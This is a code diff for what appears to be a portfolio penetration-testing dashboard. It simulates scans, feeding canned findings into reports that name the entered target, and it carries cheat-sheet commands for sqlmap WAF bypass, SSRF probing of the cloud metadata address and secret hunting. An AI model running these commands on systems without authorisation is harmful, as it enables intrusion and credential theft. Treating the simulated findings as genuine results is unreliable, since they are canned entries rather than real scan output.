+  ['w',  '\u26a0 HIGH: <span class="y">SSRF</span> — AWS IMDSv1 accessible!'],
+  ['inf','<span class="h">SecretFinder</span> analyzing <span class="g">'+rn(10,40)+'</span> JS bundles...'],
+  ['cr', '\uD83D\uDD11 HIGH: <span class="r">AWS API Keys</span> hardcoded in /static/app.js'],
+  ['inf','<span class="h">FFUF</span> fuzzing — raft-large-words...'],
+  ['ok', 'Found: <span class="g">/admin/, /backup/, /uploads/, /.git/, /.env</span>'],
+  ['w',  '\u26a0 <span class="y">.git</span> + <span class="y">.env</span> exposed!'],
+  ['ok', 'TLS, CORS, headers, SSRF checks complete'],
+  ['ok', '<span class="g">\u2713 Scan complete.</span> Generating report...'],
+  ['sys','<span class="v">AdiSecLab</span> — <span class="g">'+FINDINGS.length+' findings</span> discovered'],
+];}
+
+var SKILLS=[{n:'Web App Pentesting',p:94},{n:'Bug Bounty Hunting',p:90},{n:'Recon & OSINT',p:92},{n:'Exploitation',p:86},{n:'Network Security',p:80},{n:'Python Scripting',p:78}];
+var TPILLS=['Subfinder','Amass','Nuclei','SQLMap','DalFox','FFUF','Gobuster','Nmap','RustScan','HTTPX','Katana','ParamSpider','TruffleHog','GitLeaks','Subjack','TestSSL.sh','WPScan','S3Scanner','SecretFinder','LinkFinder','SSRFMap','Arjun','Gau','Waybackurls','Feroxbuster','KXSS','Ghauri'];
+
+var REMEDIATION={
+  critical:{focus:'Immediate — fix before anything else. These allow full compromise, RCE or data breach.',steps:['Isolate the vulnerable endpoint immediately','Rotate all exposed credentials and API keys','Deploy WAF rule as temporary mitigation','Patch root cause in source code','Audit all similar code paths']},
+  high:{focus:'Fix within 24-72 hours. Significant attacker advantage, data exposure risk.',steps:['Review and patch the vulnerable parameter/endpoint','Add proper authorization checks','Implement rate limiting','Add all OWASP security headers','Test adjacent endpoints for same issue']},
+  medium:{focus:'Fix within 1-2 weeks. May chain with other issues for higher impact.',steps:['Implement recommended security headers','Fix misconfigured CORS/CSP policies','Remove information disclosures','Enforce HTTPS with HSTS','Review third-party integrations']},
+  low:{focus:'Fix in next dev cycle. Requires pre-conditions to exploit.',steps:['Apply security hardening best practices','Remove unnecessary HTTP methods (TRACE, PUT)','Keep all dependencies updated','Remove server version banners from headers']},
+  info:{focus:'Informational — document and monitor. Reveals attack surface.',steps:['Document full attack surface discovered','Monitor all exposed services','Reduce exposed attack surface where possible','Implement network-level controls']},
+};
+
+var TOOL_FIX={
+  SQLMap:{how:'sqlmap -u "URL" --level=5 --risk=3 --dbs --batch | Use --tamper for WAF bypass | -r request.txt for Burp',fix:'Use parameterized queries/prepared statements. Never concatenate user input into SQL.'},
+  DalFox:{how:'dalfox url "URL" --deep-domxss | katana -u URL -jc | dalfox pipe | kxss < urls.txt',fix:'Implement strict Content-Security-Policy. Use contextual output encoding. Never use innerHTML with user data.'},
+  Nuclei:{how:'nuclei -l live.txt -t nuclei-templates/ -severity critical,high | nuclei -update-templates',fix:'Apply vendor patches immediately. Disable debug/admin endpoints. Restrict with IP allowlisting.'},
+  Subzy:{how:'subzy run --targets subs.txt --concurrency 100 | subjack -w subs.txt -ssl | nuclei -l subs -t takeovers/',fix:'Remove CNAME records pointing to deprovisioned services. Audit DNS records regularly.'},
+  SSRFMap:{how:'ssrfmap -r request.txt -p url -m readfiles,portscan | Test 169.254.169.254 manually via Burp',fix:'Whitelist outbound URLs. Enforce IMDSv2 on AWS. Use proxy with strict egress filtering.'},
+  SecretFinder:{how:'secretfinder -i URL/app.js | trufflehog github --org ORG | gitleaks detect -r REPO',fix:'Rotate all exposed credentials. Use environment variables. Add secret scanning to CI/CD pipeline.'},
+  FFUF:{how:'ffuf -u URL/FUZZ -w raft-large-words.txt -mc 200,301,403 | Add -x .bak,.env,.php',fix:'Disable directory listing. Remove backup files from webroot. Block sensitive paths via nginx/htaccess.'},
+  Nmap:{how:'nmap -sV -sC -p- target | rustscan -a target -- -sV | masscan -p1-65535 --rate 10000',fix:'Close unnecessary ports. Move admin services behind VPN. Implement strict firewall rules.'},
+  TestSSL:{how:'testssl.sh --full target.com | sslscan --show-certificate target.com:443',fix:'Disable TLSv1.0/1.1. Use strong cipher suites only. Enable HSTS with includeSubDomains preloading.'},
+  Nikto:{how:'nikto -h https://target.com | nikto -h target -Tuning 9 (SQLi focus)',fix:'Keep web server updated. Remove default files. Disable TRACE/OPTIONS methods.'},
+  HTTPX:{how:'httpx -l subs.txt -silent -status-code -title -tech-detect | check securityheaders.com score',fix:'Add all OWASP-recommended headers. HSTS preloading. SameSite=Strict on all cookies.'},
+  default:{how:'Reproduce the finding manually. Try chaining with other vulnerabilities for higher impact. Document PoC steps.',fix:'Principle of least privilege. Keep software updated. Defense-in-depth strategy.'},
+};
+
+/* ═══ STATE ═══ */
+var scanning=false,timer=null,findings=[],scanMode='Recon',logLines=[],findIdx=0,logIdx=0,progress=0,stepI=0;
+
+function rn(a,b){return Math.floor(Math.random()*(b-a+1)+a);}
+
+/* ═══ INIT ═══ */
+function init(){
+  // Clock
+  setInterval(function(){
+    var n=new Date();
+    var t=[n.getHours(),n.getMinutes(),n.getSeconds()].map(function(x){return String(x).padStart(2,'0');}).join(':');
+    document.getElementById('clock').textContent=t;
+  },1000);
+
+  // Nav buttons
+  document.querySelectorAll('.nav-btn[data-page]').forEach(function(btn){
+    btn.addEventListener('click',function(){goTo(this.dataset.page,this);});
+  });
+
+  // Mode buttons
+  document.getElementById('mode-row').addEventListener('click',function(e){
+    var btn=e.target.closest('.mdbtn');
+    if(!btn)return;
+    document.querySelectorAll('.mdbtn').forEach(function(b){b.classList.remove('on');});
+    btn.classList.add('on');
+    scanMode=btn.dataset.mode;
+    document.getElementById('cs-md').textContent=scanMode;
+  });
+
+  // Mobile toggle
+  document.getElementById('mob-tog').addEventListener('click',function(){
+    document.getElementById('sidebar').classList.toggle('open');
+  });
+
+  // Scan button
+  document.getElementById('scan-btn').addEventListener('click',toggleScan);
+  document.getElementById('clear-btn').addEventListener('click',clearAll);
+  document.getElementById('exp-top').addEventListener('click',exportPDF);
+
+  // Enter key on input
+  document.getElementById('target').addEventListener('keydown',function(e){
+    if(e.key==='Enter')toggleScan();
+  });
+
+  // Terminal buttons
+  document.getElementById('clear-term').addEventListener('click',function(){
+    document.getElementById('term-body').innerHTML='';
+    addLog('sys','Terminal cleared.');
+  });
+  document.getElementById('scroll-bot').addEventListener('click',scrollTerm);
+
+  // Module buttons
+  document.getElementById('ena-all').addEventListener('click',enableAll);
+  document.getElementById('dis-all').addEventListener('click',disableAll);
+
+  // Export bar
+  document.getElementById('xbar-pdf').addEventListener('click',exportPDF);
+  document.getElementById('xbar-json').addEventListener('click',exportJSON);
+  document.getElementById('xbar-csv').addEventListener('click',exportCSV);
+  document.getElementById('xbar-copy').addEventListener('click',copyFindings);
+  document.getElementById('xbar-detail').addEventListener('click',openDetail);
+
+  // Config
+  document.getElementById('save-cfg').addEventListener('click',saveConfig);
+  document.getElementById('reset-cfg').addEventListener('click',resetConfig);
+
+  // Note clear buttons
+  document.querySelectorAll('.note-clr').forEach(function(btn){
+    btn.addEventListener('click',function(){
+      var id='note-'+this.dataset.note;
+      var el=document.getElementById(id);
+      if(el){el.value='';notify('Note cleared','warn');}
+    });
+  });
+
+  // Modal close
+  document.getElementById('close-modal').addEventListener('click',function(){
+    document.getElementById('detail-modal').classList.remove('on');
+  });
+  document.getElementById('detail-modal').addEventListener('click',function(e){
+    if(e.target===this)this.classList.remove('on');
+  });
+
+  // Build dynamic sections
+  buildModules();
+  buildCommands();
+  buildTools();
+  buildSkills();
+  buildPayloads();
+
+  // Initial terminal message
+  addLog('sys','<span class="v">AdiSecLab v5.0</span> by <span class="h">Aditya Bhosale</span> — all systems ready');
+  addLog('inf','30+ modules loaded. Enter a target and press <span class="h">Launch Scan</span>.');
+}
+
+/* ═══ NAVIGATION ═══ */
+function goTo(id,btn){
+  document.querySelectorAll('.page').forEach(function(p){p.classList.remove('on');});
+  document.querySelectorAll('.nav-btn').forEach(function(b){b.classList.remove('on');});
+  var pg=document.getElementById('page-'+id);
+  if(pg)pg.classList.add('on');
+  if(btn)btn.classList.add('on');
+  var labels={scanner:'Scanner',modules:'Modules',findings:'Findings',commands:'Commands',payloads:'Payloads',tools:'Tools',notes:"Notebook",config:'Config',about:'About'};
+  document.getElementById('page-lbl').textContent=labels[id]||id;
+  if(window.innerWidth<860)document.getElementById('sidebar').classList.remove('open');
+}
+
+/* ═══ MODULES ═══ */
+function buildModules(){
+  var g=document.getElementById('mod-grid');
+  g.innerHTML='';
+  MODS.forEach(function(m){
+    var el=document.createElement('div');
+    el.className='mod'+(m.on?' on':'')+(m.cr?' cr':'');
+    el.id='m-'+m.id;
+    var hd=document.createElement('div');hd.className='mod-hd';
+    var ic=document.createElement('div');ic.className='mod-ic';ic.textContent=m.ic;
+    var sw=document.createElement('div');sw.className='tsw';
+    hd.appendChild(ic);hd.appendChild(sw);
+    var nm=document.createElement('div');nm.className='mod-nm';nm.textContent=m.nm;
+    var ds=document.createElement('div');ds.className='mod-ds';ds.textContent=m.ds;
+    el.appendChild(hd);el.appendChild(nm);el.appendChild(ds);
+    el.addEventListener('click',function(){
+      m.on=!m.on;
+      el.className='mod'+(m.on?' on':'')+(m.cr?' cr':'');
+      updateModBadge();
+      notify(m.on?'\u2713 '+m.nm+' enabled':m.nm+' disabled',m.on?'ok':'warn');
+    });
+    g.appendChild(el);
+  });
+  updateModBadge();
+}
+
+function updateModBadge(){
+  var n=MODS.filter(function(m){return m.on;}).length;
+  document.getElementById('nb-m').textContent=n;
+  document.getElementById('cs-mo').textContent=n+'/'+MODS.length;
+}
+
+function enableAll(){
+  MODS.forEach(function(m){
+    m.on=true;
+    var e=document.getElementById('m-'+m.id);
+    if(e)e.className='mod on'+(m.cr?' cr':'');
+  });
+  updateModBadge();notify('All modules enabled','ok');
+}
+
+function disableAll(){
+  MODS.forEach(function(m){
+    m.on=false;
+    var e=document.getElementById('m-'+m.id);
+    if(e)e.className='mod'+(m.cr?' cr':'');
+  });
+  updateModBadge();notify('All modules disabled','warn');
+}
+
+/* ═══ COMMANDS ═══ */
+function buildCommands(){
+  var g=document.getElementById('cmd-grid');
+  g.innerHTML='';
+  CMDS.forEach(function(sec){
+    var card=document.createElement('div');card.className='card';card.style.overflow='hidden';
+    var hd=document.createElement('div');hd.className='cmd-hd';
+    var ct=document.createElement('div');ct.className='cmd-cat';ct.textContent=sec.cat;
+    var cp=document.createElement('button');cp.className='cpbtn';cp.textContent='Copy All';
+    (function(txt,btn){
+      btn.addEventListener('click',function(){
+        navigator.clipboard.writeText(txt).then(function(){
+          btn.textContent='\u2713 Copied!';
+          setTimeout(function(){btn.textContent='Copy All';},1800);
+        }).catch(function(){fbCopy(txt);btn.textContent='\u2713 Copied!';setTimeout(function(){btn.textContent='Copy All';},1800);});
+      });
+    })(sec.txt,cp);
+    hd.appendChild(ct);hd.appendChild(cp);
+    var pre=document.createElement('pre');pre.className='cmd-pre';pre.textContent=sec.txt;
+    card.appendChild(hd);card.appendChild(pre);
+    g.appendChild(card);
+  });
+}
+
+/* ═══ TOOLS ═══ */
+function buildTools(){
+  var g=document.getElementById('tool-grid');
+  g.innerHTML='';
+  TOOLS.forEach(function(t){
+    var el=document.createElement('div');el.className='tool-item';
+    var nm=document.createElement('div');nm.className='tool-nm';nm.textContent=t.n;
+    var ds=document.createElement('div');ds.className='tool-ds';ds.textContent=t.d;
+    var ct=document.createElement('span');ct.className='tool-cat';ct.textContent=t.c;
+    el.appendChild(nm);el.appendChild(ds);el.appendChild(ct);
+    g.appendChild(el);
+  });
+}
+
+/* ═══ PAYLOADS — safe DOM, never innerHTML with payload content ═══ */
+function buildPayloads(){
+  var g=document.getElementById('payload-grid');
+  if(!g)return;
+  g.innerHTML='';
+  Object.keys(PAYLOADS).forEach(function(cat){
+    var items=PAYLOADS[cat];
+    var sec=document.createElement('div');sec.className='pl-sec card';
+    var hd=document.createElement('div');hd.className='c-head';
+    var ct=document.createElement('div');ct.className='c-title';ct.textContent='\uD83D\uDCA3 '+cat;
+    var bdg=document.createElement('span');bdg.className='chip ch-cy';bdg.textContent=items.length+' payloads';
+    hd.appendChild(ct);hd.appendChild(bdg);
+    var body=document.createElement('div');body.className='c-body';
+    var grid=document.createElement('div');grid.className='pl-grid';
+    items.forEach(function(p){
+      var chip=document.createElement('div');
+      chip.className='pl-chip';
+      chip.textContent=p;          // textContent — safe, never executed
+      chip.dataset.pl=p;
+      chip.addEventListener('click',function(){
+        var raw=this.dataset.pl;
+        var self=this;
+        var prev=self.textContent;
+        function done(){self.textContent='\u2713 Copied!';self.classList.add('pl-done');setTimeout(function(){self.textContent=prev;self.classList.remove('pl-done');},1200);}
+        if(navigator.clipboard){navigator.clipboard.writeText(raw).then(done).catch(function(){fbCopy(raw);done();});}
+        else{fbCopy(raw);done();}
+      });
+      grid.appendChild(chip);
+    });
+    body.appendChild(grid);sec.appendChild(hd);sec.appendChild(body);g.appendChild(sec);
+  });
+}
+
+function fbCopy(text){
+  var ta=document.createElement('textarea');ta.value=text;ta.style.cssText='position:fixed;opacity:0;top:0;left:0';
+  document.body.appendChild(ta);ta.focus();ta.select();
+  try{document.execCommand('copy');}catch(e){}
+  document.body.removeChild(ta);
+}
+
+/* ═══ SKILLS / ABOUT ═══ */
+function buildSkills(){
+  var sg=document.getElementById('sk-grid');
+  if(sg){
+    sg.style.cssText='display:grid;grid-template-columns:1fr 1fr;gap:10px';
+    sg.innerHTML='';
+    SKILLS.forEach(function(s){
+      var el=document.createElement('div');el.className='sk-i';
+      var nm=document.createElement('div');nm.className='sk-n';nm.textContent=s.n;
+      var bar=document.createElement('div');bar.className='sk-bar';
+      var fill=document.createElement('div');fill.className='sk-fill';fill.style.width=s.p+'%';
+      bar.appendChild(fill);
+      var pct=document.createElement('div');pct.className='sk-pct';pct.textContent=s.p+'%';
+      el.appendChild(nm);el.appendChild(bar);el.appendChild(pct);
+      sg.appendChild(el);
+    });
+  }
+  var tp=document.getElementById('tp-grid');
+  if(tp){
+    tp.innerHTML='';
+    TPILLS.forEach(function(t){
+      var el=document.createElement('span');el.className='tp';el.textContent=t;tp.appendChild(el);
+    });
+  }
+}
+
+/* ═══ SCAN ENGINE ═══ */
+function toggleScan(){if(scanning)stopScan();else startScan();}
+
+function startScan(){
+  var tgt=document.getElementById('target').value.trim();
+  if(!tgt){notify('Enter a target first','warn');document.getElementById('target').focus();return;}
+
+  scanning=true;findings=[];findIdx=0;logIdx=0;progress=0;stepI=0;
+  logLines=LOG_LINES(tgt);
+
+  var btn=document.getElementById('scan-btn');
+  btn.textContent='\u23F9 Stop Scan';btn.className='btn b-stop';
+
+  document.getElementById('prog').classList.add('on');
+  document.getElementById('exp-top').style.display='none';
+  document.getElementById('xbar').style.display='none';
+  ['s-c','s-h','s-m','s-l','s-i'].forEach(function(id){document.getElementById(id).textContent='0';});
+  document.getElementById('findings-area').innerHTML='<div class="empty"><div class="ei">\u23F3</div><p>Scan in progress\u2026</p></div>';
+  document.getElementById('find-chip').textContent='0 Findings';
+  document.getElementById('nb-f').style.display='none';
+  document.getElementById('spin').style.display='';
+
+  // Build steps
+  var sr=document.getElementById('steps');sr.innerHTML='';
+  STEPS.forEach(function(s){
+    var t=document.createElement('span');
+    t.className='step';t.id='st-'+s;t.textContent=s;
+    sr.appendChild(t);
+  });
+
+  document.getElementById('term-body').innerHTML='';
+  addLog('sys','<span class="v">AdiSecLab v5.0</span> by <span class="h">Aditya Bhosale</span> \u2014 scan started');
+  addLog('inf','Target: <span class="h">'+tgt+'</span> | Mode: <span class="y">'+scanMode+'</span>');
+
+  timer=setInterval(function(){
+    progress=Math.min(100,progress+(Math.random()*3+0.5));
+    var pct=Math.floor(progress);
+    document.getElementById('prog-fill').style.width=pct+'%';
+    document.getElementById('prog-pct').textContent=pct+'%';
+
+    // Step tracking
+    var ns=Math.min(Math.floor((progress/100)*STEPS.length),STEPS.length-1);
+    if(ns>stepI){
+      var prev=document.getElementById('st-'+STEPS[stepI]);
+      if(prev){prev.classList.remove('run');prev.classList.add('done');}
+      stepI=ns;
+      var cur=document.getElementById('st-'+STEPS[stepI]);
+      if(cur){cur.classList.add('run');document.getElementById('prog-lbl').textContent=STEPS[stepI];}
+    }
+
+    // Log lines
+    if(logIdx<logLines.length&&Math.random()>0.4){
+      var ll=logLines[logIdx++];
+      addLog(ll[0],ll[1]);
+    }
+
+    // Drip findings
+    if(progress>28&&findIdx<FINDINGS.length&&Math.random()>0.52){
+      findings.push(FINDINGS[findIdx++]);
+      renderFindings();updateStats();
+    }
+
+    if(progress>=100){
+      while(findIdx<FINDINGS.length){findings.push(FINDINGS[findIdx++]);}
+      STEPS.forEach(function(s){
+        var e=document.getElementById('st-'+s);
+        if(e){e.classList.remove('run');e.classList.add('done');}
+      });
+      renderFindings();updateStats();
+      stopScan(true);
+    }
+  },260);
+}
+
+function stopScan(done){
+  scanning=false;
+  if(timer){clearInterval(timer);timer=null;}
+  var btn=document.getElementById('scan-btn');
+  btn.textContent='\u25B6 Launch Scan';btn.className='btn b-scan';
+  document.getElementById('spin').style.display='none';
+  if(done){
+    document.getElementById('prog-fill').style.width='100%';
+    document.getElementById('prog-pct').textContent='100%';
+    document.getElementById('prog-lbl').textContent='COMPLETE';
+    document.getElementById('exp-top').style.display='';
+    if(findings.length)document.getElementById('xbar').style.display='flex';
+    notify('Scan complete \u2014 '+findings.length+' vulnerabilities found!','ok');
+    addLog('ok','<span class="g">\u2713 Complete.</span> '+findings.length+' findings \u2014 see Findings tab.');
+  }else if(done===false){
+    document.getElementById('prog-lbl').textContent='STOPPED';
+    notify('Scan stopped','warn');
+    addLog('w','Scan stopped by user.');
+  }
+}
+
+function clearAll(){
+  if(scanning)stopScan(false);
+  document.getElementById('target').value='';
+  document.getElementById('term-body').innerHTML='';
+  addLog('sys','Session cleared. Ready for new target.');
+  findings=[];
+  ['s-c','s-h','s-m','s-l','s-i'].forEach(function(id){document.getElementById(id).textContent='0';});
+  document.getElementById('findings-area').innerHTML='<div class="empty"><div class="ei">\uD83D\uDD0D</div><p>No findings yet \u2014 run a scan.</p></div>';
+  document.getElementById('find-chip').textContent='0 Findings';
+  document.getElementById('nb-f').style.display='none';
+  document.getElementById('prog').classList.remove('on');
+  document.getElementById('exp-top').style.display='none';
+  document.getElementById('xbar').style.display='none';
+}
+
+/* ═══ FINDINGS ═══ */
+function renderFindings(){
+  if(!findings.length)return;
+  var ord={critical:0,high:1,medium:2,low:3,info:4};
+  var sorted=findings.slice().sort(function(a,b){return ord[a.sv]-ord[b.sv];});
+  document.getElementById('find-chip').textContent=findings.length+' Findings';
+  var nb=document.getElementById('nb-f');nb.textContent=findings.length;nb.style.display='';
+  var wrap=document.createElement('div');wrap.style.overflowX='auto';
+  var tbl=document.createElement('table');tbl.className='ftbl';
+  var thead=document.createElement('thead');
+  var hr=document.createElement('tr');
+  ['Severity','Vulnerability','Tool'].forEach(function(h,i){
+    var th=document.createElement('th');th.textContent=h;
+    if(i===0)th.style.width='105px';if(i===2)th.style.width='110px';
+    hr.appendChild(th);
+  });
+  thead.appendChild(hr);
+  var tbody=document.createElement('tbody');
+  var svMap={critical:'c',high:'h',medium:'m',low:'l',info:'i'};
+  sorted.forEach(function(f){
+    var tr=document.createElement('tr');
+    var td1=document.createElement('td');
+    var bdg=document.createElement('span');bdg.className='sv sv-'+svMap[f.sv];bdg.textContent=f.sv.toUpperCase();
+    td1.appendChild(bdg);
+    var td2=document.createElement('td');
+    var nm=document.createElement('div');nm.className='fn';nm.textContent=f.nm;
+    var url=document.createElement('div');url.className='fu';url.textContent=f.url;
+    var ds=document.createElement('div');ds.className='fd';ds.textContent=f.ds;
+    td2.appendChild(nm);td2.appendChild(url);td2.appendChild(ds);
+    var td3=document.createElement('td');td3.style.cssText='font-family:var(--mono);font-size:11px;color:var(--vi)';td3.textContent=f.tl;
+    tr.appendChild(td1);tr.appendChild(td2);tr.appendChild(td3);
+    tbody.appendChild(tr);
+  });
+  tbl.appendChild(thead);tbl.appendChild(tbody);
+  wrap.appendChild(tbl);
+  document.getElementById('findings-area').innerHTML='';
+  document.getElementById('findings-area').appendChild(wrap);
+}
+
+function updateStats(){
+  var c={critical:0,high:0,medium:0,low:0,info:0};
+  findings.forEach(function(f){c[f.sv]++;});
+  document.getElementById('s-c').textContent=c.critical;
+  document.getElementById('s-h').textContent=c.high;
+  document.getElementById('s-m').textContent=c.medium;
+  document.getElementById('s-l').textContent=c.low;
+  document.getElementById('s-i').textContent=c.info;
+}
+
+/* ═══ TERMINAL ═══ */
+function ts(){
+  var n=new Date();
+  return[n.getHours(),n.getMinutes(),n.getSeconds()].map(function(x){return String(x).padStart(2,'0');}).join(':');
+}
+
+function addLog(ty,msg){
+  var body=document.getElementById('term-body');
+  var tmap={sys:['t-sys','SYS'],inf:['t-inf','INF'],ok:['t-ok','OK'],w:['t-w','WARN'],cr:['t-cr','CRIT']};
+  var m=tmap[ty]||tmap['inf'];
+  var line=document.createElement('div');line.className='tl';
+  var tsel=document.createElement('span');tsel.className='tts';tsel.textContent=ts();
+  var tag=document.createElement('span');tag.className='ttag '+m[0];tag.textContent=m[1];
+  var msgEl=document.createElement('span');msgEl.className='tmsg';msgEl.innerHTML=msg;
+  line.appendChild(tsel);line.appendChild(tag);line.appendChild(msgEl);
+  body.appendChild(line);
+  scrollTerm();
+}
+
+function scrollTerm(){var b=document.getElementById('term-body');b.scrollTop=b.scrollHeight;}
+
+/* ═══ CONFIG ═══ */
+function saveConfig(){
+  document.getElementById('cs-thr').textContent=document.getElementById('c-threads').value;
+  document.getElementById('cs-to').textContent=document.getElementById('c-timeout').value+'s';
+  document.getElementById('cs-rt').textContent=document.getElementById('c-rate').value+' req/s';
+  document.getElementById('cs-dp').textContent=document.getElementById('c-depth').value;
+  document.getElementById('cs-sv').textContent=document.getElementById('c-sev').value;
+  document.getElementById('cs-wl').textContent=document.getElementById('c-wl').value;
+  document.getElementById('cs-px').textContent=document.getElementById('c-proxy').value||'None';
+  notify('Config saved','ok');
+}
+function resetConfig(){
+  document.getElementById('c-threads').value='50';
+  document.getElementById('c-timeout').value='10';
+  document.getElementById('c-rate').value='150';
+  document.getElementById('c-depth').value='3';
+  document.getElementById('c-proxy').value='';
+  saveConfig();notify('Config reset');
+}
+
+/* ═══ EXPORT ═══ */
+function exportJSON(){
+  if(!findings.length){notify('No findings to export','warn');return;}
+  var tgt=document.getElementById('target').value||'unknown';
+  var c={critical:0,high:0,medium:0,low:0,info:0};findings.forEach(function(f){c[f.sv]++;});
+  var rpt={tool:'AdiSecLab v5.0.0',developer:'Aditya Bhosale',email:'adityabhosale212223@gmail.com',linkedin:'https://www.linkedin.com/in/bhsoaleaditya/',target:tgt,timestamp:new Date().toISOString(),scan_mode:scanMode,stats:Object.assign({},c,{total:findings.length}),findings:findings};
+  var blob=new Blob([JSON.stringify(rpt,null,2)],{type:'application/json'});
+  var a=document.createElement('a');a.href=URL.createObjectURL(blob);
+  a.download='AdiSecLab_'+tgt.replace(/[^a-z0-9]/gi,'_')+'_'+Date.now()+'.json';a.click();
+  notify('JSON exported','ok');
+}
+
+function exportCSV(){
+  if(!findings.length){notify('No findings to export','warn');return;}
+  var rows=[['Severity','Vulnerability','URL','Tool','Description']];
+  findings.forEach(function(f){rows.push([f.sv,'"'+f.nm+'"',f.url,f.tl,'"'+f.ds+'"']);});
+  var blob=new Blob([rows.map(function(r){return r.join(',');}).join('\n')],{type:'text/csv'});
+  var a=document.createElement('a');a.href=URL.createObjectURL(blob);
+  a.download='AdiSecLab_'+Date.now()+'.csv';a.click();
+  notify('CSV exported','ok');
+}
+
+function copyFindings(){
+  if(!findings.length){notify('No findings to copy','warn');return;}
+  var txt=findings.map(function(f){return'['+f.sv.toUpperCase()+'] '+f.nm+' \u2014 '+f.url+' ('+f.tl+')\n'+f.ds;}).join('\n\n');
+  navigator.clipboard.writeText(txt).then(function(){notify('Copied to clipboard','ok');}).catch(function(){fbCopy(txt);notify('Copied','ok');});
+}
+
+/* ═══ PDF EXPORT ═══ */
+function exportPDF(){
+  if(!findings.length){notify('Run a scan first','warn');return;}
+  var tgt=document.getElementById('target').value||'Unknown Target';
+  var now=new Date();
+  var c={critical:0,high:0,medium:0,low:0,info:0};findings.forEach(function(f){c[f.sv]++;});
+  var score=Math.min(100,c.critical*25+c.high*12+c.medium*5+c.low*2+c.info);
+  var rlbl=score>=75?'CRITICAL RISK':score>=50?'HIGH RISK':score>=25?'MEDIUM RISK':'LOW RISK';
+  var rcol=score>=75?'#ff4560':score>=50?'#ff7b00':score>=25?'#ffd60a':'#00e5a0';
+  var ord={critical:0,high:1,medium:2,low:3,info:4};
+  var sorted=findings.slice().sort(function(a,b){return ord[a.sv]-ord[b.sv];});
+
+  function sc(sv){var m={critical:'background:#ff4560;color:#fff',high:'background:#ff7b00;color:#fff',medium:'background:#ffd60a;color:#000',low:'background:#00e5a0;color:#000',info:'background:#00d4ff;color:#000'};return m[sv]||m.info;}
+
+  var findingHTML=sorted.map(function(f){
+    var rem=REMEDIATION[f.sv]||REMEDIATION.info;
+    var fx=TOOL_FIX[f.tl]||TOOL_FIX.default;
+    return '<div style="break-inside:avoid;margin-bottom:24px;border:1px solid #ddd;border-radius:8px;overflow:hidden">'
+      +'<div style="padding:12px 15px;background:#f8f8f8;border-bottom:1px solid #eee;display:flex;align-items:center;gap:9px">'
+      +'<span style="padding:2px 8px;border-radius:3px;font-size:10px;font-weight:700;'+sc(f.sv)+'">'+f.sv.toUpperCase()+'</span>'
+      +'<span style="font-size:14px;font-weight:700;color:#111">'+f.nm+'</span>'
+      +'<span style="margin-left:auto;font-family:monospace;font-size:11px;color:#888">'+f.tl+'</span></div>'
+      +'<div style="padding:14px 15px">'
+      +'<div style="font-family:monospace;font-size:11px;color:#666;margin-bottom:7px">'+f.url+'</div>'
+      +'<p style="font-size:13px;color:#333;line-height:1.7;margin-bottom:12px">'+f.ds+'</p>'
+      +'<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px">'
+      +'<div style="background:#f0f8ff;border:1px solid #c0dcf0;border-radius:6px;padding:11px"><div style="font-size:10px;font-weight:700;color:#0060a0;letter-spacing:2px;margin-bottom:5px">WHAT TO FOCUS</div><p style="font-size:12px;color:#333;line-height:1.6;margin:0">'+rem.focus+'</p></div>'
+      +'<div style="background:#f0fff4;border:1px solid #b0e8c8;border-radius:6px;padding:11px"><div style="font-size:10px;font-weight:700;color:#007040;letter-spacing:2px;margin-bottom:5px">HOW TO USE '+f.tl+'</div><p style="font-size:12px;color:#333;line-height:1.6;margin:0">'+fx.how+'</p></div>'
+      +'</div>'
+      +'<div style="background:#fff8f0;border:1px solid #f0d0a0;border-radius:6px;padding:11px;margin-bottom:9px"><div style="font-size:10px;font-weight:700;color:#c05000;letter-spacing:2px;margin-bottom:7px">REMEDIATION STEPS</div>'
+      +'<ol style="margin:0;padding-left:17px;font-size:12px;color:#333;line-height:1.9">'+rem.steps.map(function(s){return'<li>'+s+'</li>';}).join('')+'</ol></div>'
+      +'<div style="background:#f5f0ff;border:1px solid #d0c0f0;border-radius:6px;padding:11px"><div style="font-size:10px;font-weight:700;color:#6030c0;letter-spacing:2px;margin-bottom:5px">FIX GUIDANCE</div><p style="font-size:12px;color:#333;line-height:1.6;margin:0">'+fx.fix+'</p></div>'
+      +'</div></div>';
+  }).join('');
+
+  var prioRows=sorted.map(function(f,i){
+    var eff=f.sv==='critical'?'HIGH':f.sv==='high'?'MEDIUM':'LOW';
+    var tl=f.sv==='critical'?'Immediate':f.sv==='high'?'24-72h':f.sv==='medium'?'1-2 Weeks':'Next Sprint';
+    return '<tr><td style="padding:8px 11px;border:1px solid #eee"><span style="'+sc(f.sv)+';padding:2px 7px;border-radius:3px;font-size:10px;font-weight:700">#'+(i+1)+' '+f.sv.toUpperCase()+'</span></td>'
+      +'<td style="padding:8px 11px;border:1px solid #eee;font-weight:500;font-size:12px">'+f.nm+'</td>'
+      +'<td style="padding:8px 11px;border:1px solid #eee;font-family:monospace;font-size:11px;color:#666">'+f.tl+'</td>'
+      +'<td style="padding:8px 11px;border:1px solid #eee;font-size:11px;color:'+(eff==='HIGH'?'#ff4560':eff==='MEDIUM'?'#ff7b00':'#00a060')+'">'+eff+'</td>'
+      +'<td style="padding:8px 11px;border:1px solid #eee;font-size:11px">'+tl+'</td></tr>';
+  }).join('');
+
+  var html='<!DOCTYPE html><html><head><meta charset="UTF-8"><title>AdiSecLab Report \u2014 '+tgt+'</title>'
+    +'<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">'
+    +'<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Inter,sans-serif;background:#fff;color:#111;font-size:13px}'
+    +'@page{size:A4;margin:16mm 15mm}@media print{.np{display:none!important}}'
+    +'.cover{background:linear-gradient(135deg,#050810,#0c1326);color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:50px 36px;page-break-after:always;position:relative}'
+    +'.cg{position:absolute;inset:0;background-image:linear-gradient(rgba(0,212,255,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,.04) 1px,transparent 1px);background-size:40px 40px}'
+    +'.cl{width:64px;height:64px;border:2px solid #00d4ff;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:900;color:#00d4ff;margin:0 auto 16px;box-shadow:0 0 26px rgba(0,212,255,.25);background:rgba(0,212,255,.08);position:relative;z-index:1;font-family:Inter,sans-serif}'
